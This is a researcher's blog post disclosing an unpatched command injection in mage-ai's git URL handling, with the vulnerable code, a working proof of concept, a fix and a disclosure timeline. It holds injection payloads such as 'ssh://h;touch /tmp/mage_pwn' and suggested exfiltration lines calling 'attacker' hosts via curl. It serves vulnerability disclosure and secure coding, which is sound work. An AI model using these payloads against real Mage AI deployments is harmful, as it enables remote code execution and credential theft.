---
layout: post
title: "Command injection in Mage AI's git config (26 months unpatched)"
author: Yunus Aydın
date: 2026-06-14
lang: en
description: "Command injection in mage-ai's add_host_to_known_hosts via unvalidated git URL parsing. Reported April 2024, still open in master 26 months later."
keywords: "mage-ai, command injection, shell=true, CWE-78, Python security, urlparse, ssh-keyscan, subprocess, data pipeline security, security research"
canonical_url: "https://aydinnyunus.github.io/2026/06/14/command-injection-mage-ai-git-utils/"
---

I reported this OS command injection to the [mage-ai](https://github.com/mage-ai/mage-ai) project on April 11, 2024 as [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924). It got the `bug` label, got assigned to a maintainer five days later, and then nothing. As of today, June 14, 2026, the function is still vulnerable in `master`. That is 26 months open. I opened my own fix PR ([#6117](https://github.com/mage-ai/mage-ai/pull/6117)) on June 4 with a reproduction and regression test; it has not been reviewed yet.

I found this while grepping the repo for `shell=True` after noticing how many data orchestration tools delegate to git over SSH. Mage AI is a Python-based pipeline tool (think Airflow alternative) and its git integration lets users wire a remote repo into the UI. That URL flows straight into a shell.

## The vulnerable code

`mage_ai/data_preparation/git/utils.py` defines a one-line shell helper:

```python
def run_command(command: str) -> None:
    proc = subprocess.Popen(args=command, shell=True)
    proc.wait()
```

The caller that matters is `add_host_to_known_hosts`. It takes a remote repo URL from the user, runs it through `urlparse`, and feeds the result into a shell string:

```python
def add_host_to_known_hosts(remote_repo_link: str):
    url = remote_repo_link
    if url and not url.startswith('ssh://'):
        url = f'ssh://{url}'

    hostname = urlparse(url).hostname
    if hostname:
        cmd = f'ssh-keyscan -t rsa {hostname} >> {DEFAULT_KNOWN_HOSTS_FILE}'
        run_command(cmd)
        return True
    return False
```

The hostname comes from a string the user controls, and the result is interpolated into a command that runs through `/bin/sh -c`. `urlparse` is a URL parser, not a sanitizer. It will hand back a "hostname" that contains shell metacharacters without complaint.

## Proof of concept

```python
from mage_ai.data_preparation.git.utils import add_host_to_known_hosts

add_host_to_known_hosts("ssh://h;touch /tmp/mage_pwn")
```

Output:

```text
>>> add_host_to_known_hosts("ssh://h;touch /tmp/mage_pwn")
True
>>> import os; os.path.exists("/tmp/mage_pwn")
True
```

What gets executed:

```bash
/bin/sh -c 'ssh-keyscan -t rsa h;touch /tmp/mage_pwn >> ~/.ssh/known_hosts'
```

The shell sees the semicolon and runs `touch /tmp/mage_pwn` as a separate command. The file shows up, the function returns `True`, no error is raised. Swap `touch` for `curl http://attacker/$(whoami)` or a reverse shell and you have remote code execution any time the user adds a git remote.

The original PoC I filed in 2024 used the same primitive with a different shape:

```python
import subprocess
from urllib.parse import urlparse

subprocess.Popen("pwd" + urlparse("https://;whoami").hostname, shell=True)
```

Same root cause, smaller test harness.

## How it gets triggered

Mage AI exposes a git settings UI where a project owner can enter a remote repository URL. That URL is the input to `add_host_to_known_hosts`. The vulnerability fires the first time the connection is set up. In a multi-tenant deployment (Mage AI is commonly run as a shared internal service for a data team), any user who can configure the git remote can run commands as the Mage AI process user. That process typically has access to pipeline credentials, warehouse connections, and the cloud IAM role attached to the host. Practically, this is RCE on the orchestrator with whatever blast radius the IAM role grants.

## The fix

Stop using `shell=True` and pass arguments as a list. The shell never gets to interpret metacharacters because there is no shell:

```python
def add_host_to_known_hosts(remote_repo_link: str):
    url = remote_repo_link
    if url and not url.startswith('ssh://'):
        url = f'ssh://{url}'

    hostname = urlparse(url).hostname
    if not hostname or not _is_valid_hostname(hostname):
        return False

    with open(DEFAULT_KNOWN_HOSTS_FILE, 'a') as f:
        subprocess.run(
            ['ssh-keyscan', '-t', 'rsa', hostname],
            stdout=f,
            check=False,
        )
    return True
```

Two changes carry the weight. `subprocess.run([...])` with a list bypasses `/bin/sh` entirely, so a hostname like `h;touch /tmp/mage_pwn` is passed as a single literal argument to `ssh-keyscan` (which then fails to resolve it, harmlessly). The hostname validation is belt and suspenders: even if a future caller reintroduces `shell=True`, a regex that only accepts `[A-Za-z0-9.-]{1,253}` would have killed the original payload at the door.

The same fix has to be applied to `create_ssh_keys`, which uses the same `urlparse` pattern when it detects CodeCommit URLs.

## Why this keeps showing up

`shell=True` is the default mental model for anyone who has ever written a bash one-liner. You think in pipes and redirections, you type it out as a string, and `subprocess.Popen` accepts that string without complaint. The list-of-args form feels clumsier when you actually need `>>` or `|`, so people reach for `shell=True` to get the redirect they want and then never come back to it.

The other half of the story is that `urlparse` looks like sanitization. It returns a `hostname` attribute. It lowercases the value. It strips the port. It feels like the URL has been parsed and validated. None of that is true in any security sense. `urlparse` will return a hostname for `https://;whoami` and for `https://$(curl attacker.com)` and for `https://a b c`. It is a structural parser, not an allowlist. Anyone treating the output as safe to interpolate into a shell command has misread the contract.

The shape of this bug (user controlled URL, structural parsing that looks like validation, `shell=True` for a one liner that needed a redirect) shows up in almost every data tool that integrates with git over SSH. I have hit it in three other projects in the last year.

## Disclosure timeline

- **April 11, 2024**: I reported the vulnerability to mage-ai as [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924) with the PoC.
- **April 16, 2024**: Issue assigned to a maintainer. No further activity.
- **June 4, 2026**: I opened [PR #6117](https://github.com/mage-ai/mage-ai/pull/6117) with the verified reproduction against current `master`, a minimal fix, and a regression test.
- **June 14, 2026**: Still unpatched on `master`. PR awaiting review.

If you are running Mage AI in production, do not expose the git settings page to untrusted users until this is patched. If you are running a fork, apply the change from PR #6117 yourself. Don't wait 26 months.

## References

- **mage-ai issue #4924**: [https://github.com/mage-ai/mage-ai/issues/4924](https://github.com/mage-ai/mage-ai/issues/4924)
- **mage-ai PR #6117** (proposed fix): [https://github.com/mage-ai/mage-ai/pull/6117](https://github.com/mage-ai/mage-ai/pull/6117)
- **CWE-78**: [Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- **Semgrep cheat sheet**: [Python command injection](https://semgrep.dev/docs/cheat-sheets/python-command-injection/)

## Related content

- [Command injection in NLTK collocations](/2026/06/07/command-injection-nltk-collocations-eval/)
- [CRLF injection in CPython's http.server and wsgiref](/2026/04/24/crlf-injection-cpython-http-server-wsgiref/)
- [SSRF via DNS rebinding in private-network checks](/2026/03/14/ssrf-dns-rebinding-vulnerability/)
